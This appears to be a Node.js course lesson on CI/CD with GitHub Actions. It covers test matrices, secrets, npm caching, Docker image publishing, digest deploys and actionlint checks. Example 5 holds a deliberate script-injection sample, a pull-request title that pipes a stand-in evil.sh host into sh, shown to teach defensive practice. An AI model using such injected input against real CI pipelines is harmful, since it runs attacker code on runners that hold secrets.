---
title: "CI/CD with GitHub Actions"
source: written for this kit (not from geekyfrontend.in)
course: Node.js Backend Kit
tags: [geeky-frontend, nodejs-backend-kit]
---

# CI/CD with GitHub Actions

*24 min read · Updated 12 Oct 2026 · Topic 107 of 117 · added to this kit, not part of the original course*

**Source:** written for this kit — examples verified on Node v24.19.0 (and v22.23.3 for one comparison) and actionlint 1.7.12 with ShellCheck 0.11.0, Express 5.3.0, ESLint 10.12.0, supertest 7.3.1; action versions checked on their GitHub releases pages on 12 Oct 2026. No GitHub-hosted run was possible: the workflow was validated with actionlint and its steps were run locally.

---

## Why it matters

Without a pipeline, "it works" means "it worked on the laptop of whoever merged last". Typical failures:

- **Untested merges.** A pull request changes a status code, nobody runs the tests, and the first person to notice is a client in production.
- **Builds that depend on one machine.** The image that reached production was built from a working tree with an uncommitted file, a different Node version and a `node_modules` that no lockfile describes.
- **Deploys by hand.** Someone SSHes in, pulls, restarts. Nobody knows which commit is running, and a second person deploying at the same time overwrites the first.
- **Secrets in the wrong place.** A registry password is pasted into a script in the repository, where every fork can read it.

**CI** (continuous integration) runs the same checks on every push and pull request, on a clean machine, from the committed lockfile. **CD** (continuous delivery or deployment) turns a commit that passed those checks into an artifact, here a Docker image, and ships that exact artifact. GitHub Actions is the CI/CD service built into GitHub: a YAML file in `.github/workflows/` describes the jobs, and GitHub runs them on its own virtual machines ("GitHub-hosted runners") or on yours ("self-hosted runners").

## The concept, simply

A **workflow** is one YAML file. It says **when** to run (`on:` push, pull request, a schedule, a button) and **what** to run (`jobs:`). Each **job** gets a fresh runner machine and runs its **steps** in order. A step is either a shell command (`run:`) or a reusable **action** (`uses: actions/checkout@v7`), which is a packaged program with inputs (`with:`). Jobs run in parallel unless one `needs:` another.

The pipeline in this lesson has three jobs:

text

```
push / pull_request
        │
        ▼
┌──────────────────────── test (matrix: Node 22, 24, 26 — three parallel jobs) ─────────┐
│ checkout → setup-node (+ npm cache) → npm ci → npm run lint → npm test → npm run build │
└────────────────────────────────────────────────────────────────────────────────────────┘
        │ all three passed, and the event is a push to main
        ▼
┌──────────────────────── image ────────────────────────────────────────────────────────┐
│ checkout → setup-buildx → login to ghcr.io (GITHUB_TOKEN) → metadata (tags)           │
│ → build-push (lesson 101's Dockerfile) → output: image digest sha256:…                 │
└────────────────────────────────────────────────────────────────────────────────────────┘
        │
        ▼  environment "production": protection rules (reviewers, branches) must pass first
┌──────────────────────── deploy ───────────────────────────────────────────────────────┐
│ reads secrets.DEPLOY_TOKEN and vars.DEPLOY_HOOK_URL → tells the platform to run       │
│ ghcr.io/<owner>/<repo>@sha256:…                                                        │
└────────────────────────────────────────────────────────────────────────────────────────┘
```

Each box is a separate machine. Nothing on disk survives from one job to the next, so the `image` job checks out the code again and the `deploy` job only receives the digest, through a job output.

## How it works

What happens when you push a commit to a pull request (GitHub's documented behaviour; you cannot watch these steps locally):

1. GitHub reads every file in `.github/workflows/` at that commit and picks the workflows whose `on:` matches the event (`pull_request` here).
2. It expands each job's `strategy.matrix`. `node: [22, 24, 26]` turns one `test` job into three jobs that run in parallel.
3. For each job it starts a fresh runner (`runs-on: ubuntu-latest`), creates a short-lived `GITHUB_TOKEN` with the permissions from the `permissions:` key, and runs the steps in order.
4. Each `run:` step is written to a temporary script and executed. With no `shell:` key on Linux, the command is `bash -e {0}`, so the script stops at the first failing command. A non-zero exit code fails the step.
5. A failed step stops the job: the later steps are skipped unless they have an `if:` such as `failure()` or `always()`. The job is marked failed, and any job that `needs:` it is skipped.
6. Each job reports a **check** on the commit. Branch protection or a ruleset can require named checks to pass before the pull request can be merged.

**The versions of the actions (checked on 12 Oct 2026).** Each action is pinned to a major tag (`@v7`), which the maintainers move to the newest release of that major. All of these run on the `node24` action runtime (each `action.yml` says `using: node24`):

| Action | Latest release | Tag used |
|---|---|---|
| `actions/checkout` | v7.0.1 (2026-07-20) | `@v7` |
| `actions/setup-node` | v7.1.0 (2026-10-08) | `@v7` |
| `actions/cache` | v6.1.0 (2026-06-26) | `@v6` |
| `docker/setup-buildx-action` | v4.4.1 (2026-09-16) | `@v4` |
| `docker/login-action` | v4.6.0 (2026-07-29) | `@v4` |
| `docker/metadata-action` | v6.2.0 (2026-07-02) | `@v6` |
| `docker/build-push-action` | v7.4.0 (2026-09-15) | `@v7` |

A major tag can move under you. For supply-chain safety, many teams pin the full commit SHA instead (`uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1`, which is what `v7` pointed at on 12 Oct 2026) and let Dependabot propose updates. GitHub's own Docker publishing guide uses SHA pins.

**Matrix builds across Node versions.** On 12 Oct 2026, the supported Node lines (nodejs.org/en/about/previous-releases and the nodejs/Release `schedule.json`) are: **22** (Maintenance LTS until 2027-04-30), **24** (Active LTS, enters maintenance on 2026-10-20) and **26** (Current, becomes LTS on 2026-10-28). Node 20 reached end of life on 2026-04-30, so the matrix is `[22, 24, 26]`. `strategy.fail-fast` defaults to `true`: the first failing job cancels the other jobs in the matrix. This workflow sets it to `false`, so a failure on Node 26 does not hide whether 22 and 24 pass. Two related keys: `continue-on-error: true` on a job lets an experimental matrix entry fail without failing the run, and `max-parallel` caps how many matrix jobs run at once.

**Secrets vs variables, and environments.** Both are configured in the repository (or organization) settings, not in the YAML:

- **`secrets.*`** are encrypted. The runner masks their values in logs ("redaction is not guaranteed", the docs add, because a transformed value, for example base64, is not recognised). They cannot be used directly in `if:` conditions, and a workflow triggered from a fork receives none of them except `GITHUB_TOKEN`.
- **`vars.*`** are plain configuration values (a URL, a region, a feature flag). They are not masked. Use them for anything that is not secret.
- **`GITHUB_TOKEN`** is created for each job and expires when the job ends. Its permissions come from `permissions:`. This workflow gives every job `contents: read` and only the `image` job `packages: write`, which it needs to push to `ghcr.io`.
- **Environments** (Settings → Environments) group secrets and variables under a name such as `production`. A job that says `environment: production` gets that environment's secrets and variables, and **deployment protection rules** run before the job is sent to a runner: required reviewers (up to six people or teams, one approval needed, optionally "prevent self-review"), a wait timer (1 to 43,200 minutes), and deployment branches and tags (for example, only `main`). The docs say a job "cannot access environment secrets until one of the required reviewers approves it". On Free, Pro and Team plans, required reviewers and wait timers are only available for public repositories.

> ⚠️ Unverified: the environment protection rules, the approval flow, secret masking and the fork rule are GitHub-side behaviour, described here from GitHub's documentation. No GitHub repository or runner was available, so none of it was exercised.

**Caching dependencies.** `npm ci` deletes `node_modules` and installs exactly what `package-lock.json` says, so caching `node_modules` itself buys nothing with `npm ci`. What is worth caching is npm's download cache, `~/.npm`. There are two ways:

- **`actions/setup-node` with `cache: npm`.** One line. It hashes `package-lock.json` into the cache key, restores `~/.npm` before your steps and saves it after a successful job. Its README says plainly: "The action does not cache `node_modules`". Since setup-node v5, caching is also turned on automatically when `package.json` has a `packageManager` (or `devEngines.packageManager`) field naming npm; `package-manager-cache: false` turns that off (changed in setup-node v6: automatic caching limited to npm).
- **`actions/cache` directly.** You choose `path`, `key` and `restore-keys` yourself (Example 7). Use it when you need a different key (per Node version, say) or to cache something other than the package manager's directory.

Both use the same GitHub cache service. Its rules (from the dependency-caching reference): a run can restore caches from its own branch and from the default branch; a cache created by a `pull_request` run is scoped to that PR's merge ref; entries unused for 7 days are removed; the default limit is 10 GB per repository. Since June 2026, only some triggers (`push`, `workflow_dispatch`, `schedule` and a few others) may write caches in the default branch's scope; `pull_request_target`, `issue_comment` and `workflow_run` get read-only access, to stop cache poisoning. The Docker layer cache in the `image` job (`cache-from: type=gha`, `cache-to: type=gha,mode=max`) uses the same service.

> ⚠️ Unverified: cache hits, restore order and eviction were not observed; they happen only on GitHub's runners.

**Building and pushing the image.** The `image` job runs only for pushes to `main` (`if: github.event_name == 'push' && github.ref == 'refs/heads/main'`), so pull requests are tested but publish nothing. `docker/login-action` logs in to `ghcr.io` with `username: ${{ github.actor }}` and `password: ${{ secrets.GITHUB_TOKEN }}`, the combination GitHub's publishing guide uses. `docker/metadata-action` turns the commit into tags: `type=sha` gives `sha-860c190`-style tags, and `type=raw,value=latest,enable={{is_default_branch}}` adds `latest` on the default branch. It also lowercases the image name, which matters because registry names must be lowercase and `github.repository` may not be. `docker/build-push-action` builds lesson 101's Dockerfile with BuildKit and pushes it. Its `digest` output (`sha256:…`) identifies the exact image bytes.

**Deploying.** The `deploy` job deploys by **digest**, not by tag. A tag such as `latest` can be moved to another image later, but a digest always names the same bytes, so what was tested is what runs. How the platform receives the image differs (a webhook as here, `kubectl set image` in lesson 105, a cloud CLI in lesson 106). The job-level `concurrency: deploy-production` with `cancel-in-progress: false` makes deploys run one at a time. The workflow-level `concurrency` cancels older runs only for pull requests. On `main`, cancelling a run could stop a deploy half-way, so a newer run waits instead. GitHub keeps at most one waiting run per group by default and cancels an older waiting one.

**Required checks.** Running CI is not the same as enforcing it. In **Settings → Branches** (branch protection rule) or **Settings → Rules → Rulesets** for `main`, you turn on "Require status checks to pass before merging" and add the check names. For this workflow those are the three matrix jobs, named by `name: test (Node ${{ matrix.node }})`. "Require branches to be up to date before merging" (the "strict" type, the default) also forces the PR to include the latest `main` before it can merge. Facts from the docs that cause surprises:

- A required check passes if its status is `successful`, `skipped` or `neutral`. A job that is skipped by an `if:` reports "Success" and does not block the merge.
- If two workflows contain jobs with the same name, the check result is ambiguous. GitHub's tip is to keep job names unique across workflows.
- A required check that never reports (for example, its workflow did not run because of a `paths:` filter) stays pending and blocks the merge.

> ⚠️ Unverified: branch protection, rulesets and the exact check names that appear in the picker (expected: `test (Node 22)`, `test (Node 24)`, `test (Node 26)`) are configured in GitHub's web UI and could not be exercised here.

**Reading a failed run.** A run's page lists the jobs; a red job opens on its log, with the failing step expanded. The step's log is the command's own stdout and stderr, so a failing `npm test` shows exactly what Example 4 shows locally: the test runner's report, then the step ends with the command's exit code. Read it from the top of the failing step, not from the bottom: the first error is the cause, and later lines are often consequences. Three habits help:

- **Reproduce locally with the same commands.** The steps are plain `npm ci`, `npm run lint`, `npm test`, `npm run build`, so a red step can be re-run on a laptop (Example 3).
- **Check which matrix leg failed.** Only `test (Node 26)` red usually means a runtime difference, not a logic bug.
- **Know the runner's shell.** `bash -e` stops at the first failing command. A pipe like `npm test | tee log` hides `npm test`'s exit code unless you set `shell: bash`, which adds `-o pipefail`.

> ⚠️ Unverified: the layout of GitHub's run page and the exact line the runner prints at the end of a failed step. The local equivalent (output plus exit code) is in Example 4.

## Code examples

**Example 1 — the sample app the pipeline tests.** A small Express 5 orders API, reused in lesson 104. The database and Redis clients are passed in, so tests can use fakes. The scripts are what CI calls:

json

```
{
  "name": "orders-api",
  "version": "1.0.0",
  "scripts": {
    "test": "node --test",
    "lint": "eslint .",
    "build": "node scripts/build.mjs",
    "start": "node dist/server.js",
    "migrate": "node dist/migrate.js"
  },
  "type": "module",
  "dependencies": {
    "express": "^5.3.0",
    "ioredis": "^6.0.0",
    "pg": "^8.23.1"
  },
  "devDependencies": {
    "@eslint/js": "^10.0.1",
    "eslint": "^10.12.0",
    "globals": "^17.13.0",
    "supertest": "^7.3.1"
  }
}
```

javascript

```
// src/app.js — Express 5 app; the database and cache clients are passed in,
// so tests can hand it fakes and server.js hands it real clients
import express from 'express';

export function createApp({ db, cache }) {
  const app = express();
  app.use(express.json());

  // liveness: the process can answer; no dependency is checked
  app.get('/healthz', (req, res) => res.json({ ok: true }));

  // readiness: Postgres and Redis must both answer
  app.get('/readyz', async (req, res) => {
    const checks = {};
    try {
      await db.query('SELECT 1');
      checks.postgres = 'up';
    } catch (err) {
      checks.postgres = `down (${err.code ?? err.message})`;
    }
    try {
      checks.redis = (await cache.ping()) === 'PONG' ? 'up' : 'down';
    } catch (err) {
      checks.redis = `down (${err.message})`;
    }
    const ready = checks.postgres === 'up' && checks.redis === 'up';
    res.status(ready ? 200 : 503).json({ ready, checks });
  });

  app.get('/orders', async (req, res) => {
    const { rows } = await db.query('SELECT id, item, qty FROM orders ORDER BY id');
    res.json(rows);
  });

  app.post('/orders', async (req, res) => {
    // Express 5: req.body is undefined when the request has no body
    const { item, qty } = req.body ?? {};
    if (typeof item !== 'string' || !Number.isInteger(qty) || qty < 1) {
      return res.status(422).json({ error: 'item (string) and qty (integer >= 1) are required' });
    }
    const { rows } = await db.query(
      'INSERT INTO orders (item, qty) VALUES ($1, $2) RETURNING id, item, qty',
      [item, qty],
    );
    res.status(201).json(rows[0]);
  });

  return app;
}
```

javascript

```
// test/app.test.js — node:test + supertest against fake clients (no real services)
import { test } from 'node:test';
import assert from 'node:assert/strict';
import request from 'supertest';
import { createApp } from '../src/app.js';

const db = { query: async () => ({ rows: [{ id: 1, item: 'pen', qty: 2 }] }) };
const cache = { ping: async () => 'PONG' };
const redisDown = { ping: async () => { throw new Error('connect ECONNREFUSED'); } };

test('GET /healthz answers without touching dependencies', async () => {
  const res = await request(createApp({ db: null, cache: null })).get('/healthz');
  assert.equal(res.status, 200);
});

test('GET /readyz is 200 when Postgres and Redis answer', async () => {
  const res = await request(createApp({ db, cache })).get('/readyz');
  assert.equal(res.status, 200);
  assert.deepEqual(res.body.checks, { postgres: 'up', redis: 'up' });
});

test('GET /readyz is 503 when Redis is down', async () => {
  const res = await request(createApp({ db, cache: redisDown })).get('/readyz');
  assert.equal(res.status, 503);
  assert.equal(res.body.checks.redis, 'down (connect ECONNREFUSED)');
});

test('POST /orders without a body is 422, not a crash', async () => {
  const res = await request(createApp({ db, cache })).post('/orders');
  assert.equal(res.status, 422);
});
```

javascript

```
// eslint.config.js — ESLint 10 flat config
import js from '@eslint/js';
import globals from 'globals';
import { defineConfig, globalIgnores } from 'eslint/config';

export default defineConfig([
  globalIgnores(['dist/', 'coverage/']),
  js.configs.recommended,
  { languageOptions: { sourceType: 'module', globals: globals.node } },
]);
```

javascript

```
// scripts/build.mjs — this sample is plain JavaScript, so "build" only copies
// src/ to dist/ (the layout lesson 101's Dockerfile expects). A TypeScript
// project would run tsc here instead.
import { rmSync, cpSync, readdirSync } from 'node:fs';

rmSync('dist', { recursive: true, force: true });
cpSync('src', 'dist', { recursive: true });
console.log(`built dist/: ${readdirSync('dist').sort().join(', ')}`);
```

`src/server.js` and `src/migrate.js` are in lesson 104, Examples 1 and 2. The repository root also holds lesson 101's corrected Dockerfile (`node:24` builder, `node:24-slim` runtime, comments on their own lines) and its `.dockerignore`.

**Example 2 — the complete workflow, validated with actionlint.**

yaml

```
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

# least privilege for every job; jobs that need more ask for it
permissions:
  contents: read

# a new push to a PR cancels that PR's older run. On main a running run is
# not cancelled (it may be deploying); the newer run waits as "pending"
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  test:
    name: test (Node ${{ matrix.node }})
    runs-on: ubuntu-latest
    timeout-minutes: 15
    strategy:
      # let every Node line finish, so one failure does not hide another
      fail-fast: false
      matrix:
        node: [22, 24, 26]
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: ${{ matrix.node }}
          # caches ~/.npm keyed on package-lock.json; npm ci still runs
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test
      - run: npm run build

  image:
    needs: test
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      # GITHUB_TOKEN may push to ghcr.io only with this
      packages: write
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v7
      - uses: docker/setup-buildx-action@v4
      - uses: docker/login-action@v4
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: meta
        uses: docker/metadata-action@v6
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=sha
            type=raw,value=latest,enable={{is_default_branch}}
      - id: push
        uses: docker/build-push-action@v7
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy:
    needs: image
    runs-on: ubuntu-latest
    # protection rules on "production" (reviewers, branches) run before this job starts
    environment:
      name: production
      url: ${{ vars.APP_URL }}
    # never cancel a deploy half-way; queue the next one instead
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    steps:
      - name: Tell the platform to run the new image
        env:
          IMAGE: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.image.outputs.digest }}
          DEPLOY_HOOK_URL: ${{ vars.DEPLOY_HOOK_URL }}
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: |
          curl --fail-with-body -sS -X POST "$DEPLOY_HOOK_URL" \
            -H "Authorization: Bearer $DEPLOY_TOKEN" \
            -H 'Content-Type: application/json' \
            -d "{\"image\":\"$IMAGE\"}"
```

The deploy step passes `secrets.*` and `vars.*` to the script through `env:` and uses `"$VAR"` inside it, instead of writing `${{ secrets.DEPLOY_TOKEN }}` into the script text. An expression in `run:` is pasted into the script before bash runs it, so a value containing quotes or `$(…)` would become code. actionlint flags this pattern for untrusted inputs (Example 5).

actionlint (1.7.12, the release binary, sha256 checked against `actionlint_1.7.12_checksums.txt`) parses the workflow, type-checks every `${{ }}` expression and runs ShellCheck on each `run:` script when `shellcheck` is on `PATH`. It prints nothing and exits 0 when it finds no problems:

bash

```
$ actionlint -version
1.7.12
installed by downloading from release page
built with go1.26.1 compiler for linux/amd64
$ actionlint -verbose .github/workflows/ci.yml
verbose: Linting .github/workflows/ci.yml
verbose: Found 0 parse errors in 0 ms for .github/workflows/ci.yml
verbose: Rule "pyflakes" was disabled: exec: "pyflakes": executable file not found in $PATH
verbose: Found total 0 errors in 56 ms for .github/workflows/ci.yml
$ echo $?
0
```

Run with no file argument, actionlint looks for the repository root and fails outside a git repository (`no project was found in any parent directories … check workflows directory is put correctly in your Git repository`, exit code 3). Passing the file path works anywhere. Without `shellcheck` on `PATH`, the verbose output says `Rule "shellcheck" was disabled`, and shell bugs inside `run:` go unchecked.

> ⚠️ Unverified: everything that happens when GitHub runs this workflow (the matrix jobs, the cache, the GHCR login and push, the environment gate, the deploy call). actionlint checks syntax, expressions and scripts; it does not run anything.

**Example 3 — the `test` job's steps, run locally.** `ci-local.sh` runs the four `run:` steps in order, each in its own `bash -e` process like a runner step, and stops at the first failure:

bash

```
#!/usr/bin/env bash
# ci-local.sh — runs the test job's `run:` steps in order, each in its own
# `bash -e` process like a runner step; stops at the first step that fails
for step in "npm ci" "npm run lint" "npm test" "npm run build"; do
  echo "=== step: $step"
  bash -e -c "$step"
  code=$?
  if [ "$code" -ne 0 ]; then
    echo "=== step '$step' exited with code $code; later steps are skipped"
    exit "$code"
  fi
done
echo "=== all steps passed"
```

bash

```
$ bash ci-local.sh
=== step: npm ci

added 182 packages, and audited 183 packages in 2s

51 packages are looking for funding
  run `npm fund` for details

found 0 vulnerabilities
=== step: npm run lint

> orders-api@1.0.0 lint
> eslint .

=== step: npm test

> orders-api@1.0.0 test
> node --test

✔ GET /healthz answers without touching dependencies (36.727367ms)
✔ GET /readyz is 200 when Postgres and Redis answer (8.929361ms)
✔ GET /readyz is 503 when Redis is down (5.149434ms)
✔ POST /orders without a body is 422, not a crash (5.440299ms)
ℹ tests 4
ℹ suites 0
ℹ pass 4
ℹ fail 0
ℹ cancelled 0
ℹ skipped 0
ℹ todo 0
ℹ duration_ms 301.024112
=== step: npm run build

> orders-api@1.0.0 build
> node scripts/build.mjs

built dist/: app.js, migrate.js, server.js
=== all steps passed
$ echo $?
0
```

ESLint prints nothing when the code is clean. That is normal, not a sign that it skipped the files.

**Example 4 — edge case: reading a failed test step.** Someone changes the validation response from 422 to 400 (`return res.status(400)…` in `src/app.js`) and pushes. The same local run:

bash

```
$ bash ci-local.sh
=== step: npm ci
…
=== step: npm run lint

> orders-api@1.0.0 lint
> eslint .

=== step: npm test

> orders-api@1.0.0 test
> node --test

✔ GET /healthz answers without touching dependencies (49.00336ms)
✔ GET /readyz is 200 when Postgres and Redis answer (8.127461ms)
✔ GET /readyz is 503 when Redis is down (5.145258ms)
✖ POST /orders without a body is 422, not a crash (7.094816ms)
ℹ tests 4
ℹ suites 0
ℹ pass 3
ℹ fail 1
ℹ cancelled 0
ℹ skipped 0
ℹ todo 0
ℹ duration_ms 341.252598

✖ failing tests:

test at test/app.test.js:28:1
✖ POST /orders without a body is 422, not a crash (7.094816ms)
  AssertionError [ERR_ASSERTION]: Expected values to be strictly equal:
  
  400 !== 422
  
      at TestContext.<anonymous> (file:///…/test/app.test.js:30:10)
      at process.processTicksAndRejections (node:internal/process/task_queues:104:5)
      at async Test.run (node:internal/test_runner/test:1389:7)
      at async Test.processPendingSubtests (node:internal/test_runner/test:960:7) {
    generatedMessage: true,
    code: 'ERR_ASSERTION',
    actual: 400,
    expected: 422,
    operator: 'strictEqual',
    diff: 'simple'
  }
=== step 'npm test' exited with code 1; later steps are skipped
$ echo $?
1
$ ls dist
ls: cannot access 'dist': No such file or directory
```

How to read it, top to bottom:

1. **Which step.** `npm test` failed; `npm ci` and lint passed. In the GitHub UI this is the expanded red step.
2. **Which test.** `✖ POST /orders without a body is 422, not a crash`, defined at `test/app.test.js:28:1`.
3. **What differed.** `actual: 400, expected: 422`, at `app.test.js:30:10`, the `assert.equal(res.status, 422)` line.
4. **The exit code.** `node --test` exits 1 when any test fails. That non-zero code is the only thing the runner uses to decide that the step failed.
5. **What did not run.** `npm run build` was skipped, so no `dist/` exists, and on GitHub the `image` and `deploy` jobs would be skipped because they `need` `test`.

The same run under **Node 22** looks different. Since Node v23.0.0, `node --test` uses the `spec` reporter when stdout is not a terminal (changed in v23.0.0; before that it used `tap`). A CI log is not a terminal, so the Node 22 matrix leg prints TAP:

bash

```
$ node --version
v22.23.3
$ node --test
TAP version 13
…
# Subtest: POST /orders without a body is 422, not a crash
not ok 4 - POST /orders without a body is 422, not a crash
  ---
  duration_ms: 10.308608
  type: 'test'
  location: '/…/test/app.test.js:28:1'
  failureType: 'testCodeFailure'
  error: |-
    Expected values to be strictly equal:
    
    400 !== 422
    
  code: 'ERR_ASSERTION'
  name: 'AssertionError'
  expected: 422
  actual: 400
  operator: 'strictEqual'
…
1..4
# tests 4
# suites 0
# pass 3
# fail 1
…
$ echo $?
1
```

Add `--test-reporter=spec` to the `test` script if you want the same format on every matrix leg.

A lint failure looks like this (an unused import added to `src/app.js`):

bash

```
$ npm run lint

> orders-api@1.0.0 lint
> eslint .


/…/src/app.js
  4:10  error  'randomUUID' is defined but never used  no-unused-vars

✖ 1 problem (1 error, 0 warnings)

$ echo $?
1
```

**Example 5 — a broken workflow and actionlint's real errors.** Six deliberate mistakes:

yaml

```
# .github/workflows/ci-broken.yml — six deliberate mistakes
name: CI

on:
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latst
    strategy:
      matrix:
        node: [22, 24, 26]
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: ${{ matrix.nodes }}
          cache: npm
      - run: npm ci
      - run: echo "Testing ${{ github.event.pull_request.title }}"
      - run: npm test

  deploy:
    needs: tests
    if: secrets.DEPLOY_TOKEN != ''
    runs-on: ubuntu-latest
    steps:
      - run: echo 'deploying $GITHUB_SHA'
      - run: ./deploy.sh
```

bash

```
$ actionlint .github/workflows/ci-broken.yml
.github/workflows/ci-broken.yml:9:14: label "ubuntu-latst" is unknown. available labels are "windows-latest", "windows-latest-8-cores", "windows-2025", "windows-2025-vs2026", "windows-2022", "windows-11-arm", "ubuntu-slim", "ubuntu-latest", "ubuntu-latest-4-cores", "ubuntu-latest-8-cores", "ubuntu-latest-16-cores", "ubuntu-24.04", "ubuntu-24.04-arm", "ubuntu-22.04", "ubuntu-22.04-arm", "macos-latest", "macos-latest-xlarge", "macos-latest-large", "macos-26-intel", "macos-26-xlarge", "macos-26-large", "macos-26", "macos-15-intel", "macos-15-xlarge", "macos-15-large", "macos-15", "macos-14-xlarge", "macos-14-large", "macos-14", "self-hosted", "x64", "arm", "arm64", "linux", "macos", "windows". if it is a custom label for self-hosted runner, set list of labels in actionlint.yaml config file [runner-label]
  |
9 |     runs-on: ubuntu-latst
  |              ^~~~~~~~~~~~
.github/workflows/ci-broken.yml:17:29: property "nodes" is not defined in object type {node: number} [expression]
   |
17 |           node-version: ${{ matrix.nodes }}
   |                             ^~~~~~~~~~~~
.github/workflows/ci-broken.yml:20:32: "github.event.pull_request.title" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [expression]
   |
20 |       - run: echo "Testing ${{ github.event.pull_request.title }}"
   |                                ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.github/workflows/ci-broken.yml:23:3: job "deploy" needs job "tests" which does not exist in this workflow [job-needs]
   |
23 |   deploy:
   |   ^~~~~~~
.github/workflows/ci-broken.yml:25:9: context "secrets" is not allowed here. available contexts are "github", "inputs", "needs", "vars". see https://docs.github.com/en/actions/learn-github-actions/contexts#context-availability for more details [expression]
   |
25 |     if: secrets.DEPLOY_TOKEN != ''
   |         ^~~~~~~~~~~~~~~~~~~~
.github/workflows/ci-broken.yml:28:9: shellcheck reported issue in this script: SC2016:info:1:6: Expressions don't expand in single quotes, use double quotes for that [shellcheck]
   |
28 |       - run: echo 'deploying $GITHUB_SHA'
   |         ^~~~
$ echo $?
1
```

What each one would have done on GitHub:

| Line | Mistake | On GitHub |
|---|---|---|
| 9 | Typo in the runner label | The job waits for a runner with that label |
| 17 | `matrix.nodes` instead of `matrix.node` | The expression gives an empty string, so setup-node gets no version |
| 20 | PR title pasted into a script | Script injection: a title like `"; curl evil.sh \| sh; "` runs as code |
| 24 | `needs: tests` | The workflow is invalid and does not start |
| 25 | `secrets` in a job `if:` | Not allowed there (the docs suggest a job-level `env` variable instead) |
| 28 | `$GITHUB_SHA` in single quotes | Prints the literal text `$GITHUB_SHA` |

> ⚠️ Unverified: the "On GitHub" column is the documented or expected behaviour, not an observed run.

Fix line 20 the same way as the deploy step in Example 2: `env: { TITLE: ${{ github.event.pull_request.title }} }` and `run: echo "Testing $TITLE"`.

**Example 6 — edge case: actionlint does not know action versions newer than itself.** actionlint checks `with:` inputs against a table of popular actions built into the binary. actionlint 1.7.12 was released on 2026-03-30, before setup-node v7 (2026-07-14):

yaml

```
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-node@v7
        with:
          node_version: 24
      - uses: actions/setup-node@v4
        with:
          node_version: 24
      - uses: actions/checkout@v9
```

bash

```
$ actionlint .github/workflows/inputs.yml
.github/workflows/inputs.yml:11:11: input "node_version" is not defined in action "actions/setup-node@v4". available inputs are "always-auth", "architecture", "cache", "cache-dependency-path", "check-latest", "mirror", "mirror-token", "node-version", "node-version-file", "registry-url", "scope", "token" [action]
   |
11 |           node_version: 24
   |           ^~~~~~~~~~~~~
$ echo $?
1
```

The same typo (`node_version` for `node-version`) is caught on `@v4` but not on `@v7`, and `actions/checkout@v9`, a tag that does not exist, passes as well. A clean actionlint run does not prove that every input name is right for a newer action. Check the inputs against that version's `action.yml` (setup-node v7's inputs are `node-version`, `node-version-file`, `architecture`, `check-latest`, `registry-url`, `scope`, `token`, `cache`, `package-manager-cache`, `cache-dependency-path`, `mirror`, `mirror-token`), and update actionlint when a new major of an action you use ships.

**Example 7 — `actions/cache` instead of setup-node's `cache:`.** The key includes the Node version and the lockfile hash. `restore-keys` falls back to the newest cache for the same Node version when the lockfile changed. `npm ci` always runs, because `~/.npm` is only a download cache.

yaml

```
# .github/workflows/ci-actions-cache.yml — the test job with actions/cache instead of setup-node's cache
name: CI (actions/cache)
on: [push, pull_request]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node: [22, 24, 26]
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: ${{ matrix.node }}
          # no setup-node cache here: actions/cache below owns ~/.npm
          package-manager-cache: false
      - id: npm-cache
        uses: actions/cache@v6
        with:
          path: ~/.npm
          key: npm-${{ runner.os }}-node${{ matrix.node }}-${{ hashFiles('package-lock.json') }}
          restore-keys: |
            npm-${{ runner.os }}-node${{ matrix.node }}-
      - name: Show whether the key matched exactly
        env:
          HIT: ${{ steps.npm-cache.outputs.cache-hit }}
        run: echo "exact cache hit = $HIT"
      - run: npm ci
      - run: npm test
```

bash

```
$ actionlint .github/workflows/ci-actions-cache.yml
$ echo $?
0
```

`cache-hit` is `true` only when the primary `key` matched; a `restore-keys` match gives `false` (actions/cache README). In the first draft of this file, the "show" step was the one-liner `- run: echo "exact cache hit: ${{ steps.npm-cache.outputs.cache-hit }}"`, and actionlint rejected the whole file:

bash

```
$ actionlint .github/workflows/ci-actions-cache.yml
.github/workflows/ci-actions-cache.yml:26:34: could not parse as YAML: mapping values are not allowed in this context [syntax-check]
   |
26 |       - run: echo "exact cache hit: ${{ steps.npm-cache.outputs.cache-hit }}"
   |                                  ^~
$ echo $?
1
```

The value of `run:` starts with `echo`, so YAML reads it as a plain scalar, and a plain scalar may not contain `: ` (colon and space). The quotes inside do not help, because they are not at the start of the value. Use a block scalar (`run: |`) or quote the whole value. This is a YAML rule, not an actionlint rule, so any YAML parser rejects the file, including GitHub's.

## Common mistakes & gotchas

- **`npm install` in CI.** It may update the lockfile and resolve different versions than the developer had. `npm ci` installs exactly the lockfile and fails if `package.json` and the lockfile disagree.
